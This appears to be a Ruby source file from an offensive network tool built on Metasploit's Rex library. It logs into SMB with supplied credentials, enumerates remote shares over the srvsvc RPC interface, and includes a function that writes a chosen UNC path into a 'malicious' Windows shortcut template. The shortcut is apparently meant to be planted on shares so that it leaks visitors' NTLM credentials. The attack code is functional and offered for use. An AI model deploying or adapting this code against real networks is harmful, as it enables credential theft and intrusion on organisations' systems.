def generate_smb_client(host, port, creds)

	sock_params = {PeerHost: host, PeerPort: port}.stringify_keys()

	# create socket: Smb::create_tcp
	sock = Rex::Socket::create_tcp(sock_params)

	### POTENTIAL ISSUES HERE ###
	#  Determines if direct smb connections are made
	if port == 445
		direct = true
	else
		direct = false
	end

	# create simpleclient
	sclient = Rex::Proto::SMB::SimpleClient.new(sock, direct)

	# login
	sclient.login('',
		creds.username,
		creds.password,
		creds.domain)

	return sclient

end

def generate_malicious_lnk(config)
	# Create link template with evil unc path
	unc_path = Rex::Text::to_unicode(config.unc_path,'utf-16be')
	$template.slice!(0x0229..0x0270)
	$template.insert(0x0229, unc_path)
end

def parse_error_message(message)
	message.gsub(/^.+error\:\s/,'')
end

def srvsvc_enumerate(peerhost, creds)

	peerport = 445

	socket_opts = 	{
						'PeerHost'		=>	peerhost,
						'PeerPort'		=>	peerport
					}

	sock = Rex::Socket::create_tcp(socket_opts)

	uuid = '4b324fc8-1670-01d3-1278-5a47bf6ee188'

	handle = Rex::Proto::DCERPC::Handle.new([uuid,'3.0'], 'ncacn_np', peerhost, ["\\srvsvc"])

	dclient_opts =  {
						'smb_user'			=>	creds.username,
						'smb_pass'			=>	creds.password,
						'smb_pipeio'		=>	'rw',
						'smb_name'			=>	nil,
						'read_timeout'		=>	10,
						'connect_timeout'	=>	5
					}


	dclient = Rex::Proto::DCERPC::Client.new(handle, sock, dclient_opts)

	#### CREDIT TO METASPLOIT FOR THE FOLLOWING CODE ####

	stubdata = Rex::Encoder::NDR.uwstring("\\\\#{peerhost}") +
		Rex::Encoder::NDR.long(1)

	ref_id = stubdata[0,4].unpack("V")[0]
	ctr = [1, ref_id + 4 , 0, 0].pack("VVVV")

	stubdata << ctr
	stubdata << Rex::Encoder::NDR.align(ctr)
	stubdata << ["FFFFFFFF"].pack("H*")
	stubdata << [ref_id + 8, 0].pack("VV")

	response = dclient.call(0x0f, stubdata)
	res = response.dup

	shares = []

	win_error = res.slice!(-4, 4).unpack("V")[0]

	if win_error != 0
	  puts "Warning (DCE/RPC error): Win_error = #{win_error + 0}"
	  return shares
	end

	# remove some uneeded data
	res.slice!(0,12) # level, CTR header, Reference ID of CTR
	share_count = res.slice!(0, 4).unpack("V")[0]

	res.slice!(0,4) # Reference ID of CTR1
	share_max_count = res.slice!(0, 4).unpack("V")[0]

	###
	out_of_balance_warning = %[Warning (Dce/RPC error): Unknow situation encountered count !=
		count max (#{share_count}/#{share_max_count})]
	if share_max_count != share_count
		puts out_of_balance_warning
		return shares
	end

	# RerenceID / Type / ReferenceID of Comment
	types = res.slice!(0, share_count * 12)
		.scan(/.{12}/n)
		.map{|a| a[4,2]
		.unpack("v")[0]}

	share_count.times do |t|

		begin

			length, offset, max_length = res.slice!(0, 12).unpack("VVV")

			if offset != 0
				raise "Warning (Dce/RPC error): Unknow situation encountered offset != 0 (#{offset})"
			elsif length != max_length
				raise "Warning (Dce/RPC error): Unknow situation encountered length !=max_length (#{length}/#{max_length})"
			end

			name = res.slice!(0, 2 * length)
			res.slice!(0,2) if length % 2 == 1 # pad

			comment_length, comment_offset, comment_max_length = res.slice!(0, 12).unpack("VVV")

			if comment_offset != 0
				raise "Warning (Dce/RPC error): Unknow situation encountered comment_offset != 0 (#{comment_offset})"
			elsif comment_length != comment_max_length
				raise "Warning (Dce/RPC error): Unknow situation encountered comment_length != comment_max_length (#{comment_length}/#{comment_max_length})"
			end

			comment = res.slice!(0, 2 * comment_length)
			res.slice!(0,2) if comment_length % 2 == 1 # pad

			name    = Rex::Text.to_ascii(name)
			s_type  = types[t]
			comment = Rex::Text.to_ascii(comment)

			[name,comment].each {|s| s.gsub!("\x00",'')}
			shares << Share.new(name, s_type, comment, peerhost, peerport)

		rescue => error

			puts error.message()
			puts "Error raised, continuing to next share..."
			next # share

		end

	end  

	# Sysvol shares are causing unexpected errors....strange
	shares.delete_if{|s| s.type != :DISK or s.name =~ /sysvol/i}

end